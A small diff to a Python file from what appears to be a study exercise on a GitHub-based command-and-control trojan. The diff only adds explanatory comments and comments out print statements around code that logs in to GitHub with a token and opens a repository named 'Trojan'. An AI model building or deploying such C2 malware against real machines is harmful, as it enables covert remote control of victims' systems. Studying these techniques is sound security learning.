@@ -1,11 +1,13 @@
 import base64
 import github3
+#* https://github3.readthedocs.io/en/latest/
 import importlib
 import json
 import os
 import random
 import sys
 import threading
+#? use the lscpu command in Linux to identify how many threads on a system
 import time
 
 # import dirlister
@@ -19,7 +21,8 @@ from datetime import datetime
 #? Read for Contents, Metadata, Pull requests
 
 PATH = os.getcwd()+'/Chapter7-GitHubC2/'
-print(f'os.getcwd: {os.getcwd()}')
+# print(f'os.getcwd: {os.getcwd()}')
+#? Prints the directory the file is executing from
 
 def github_connect():
 
@@ -31,9 +34,15 @@ def github_connect():
 
     user = 'agogeio'
     sess = github3.login(token=token)
+    #* To allow you to specify either a username and password combination or
+    #* a token, none of the parameters are required. If you provide none of
+    #* them, you will receive ``None``.
+    # print(f'Session: {sess}')
 
     try:
         github = sess.repository(user, 'Trojan')
+        #? Gets the requested repo
+        # print(f'GitHub Repo: {github}')
         return github
     except Exception as e:
         print(f'GitHub connection error: {e}')
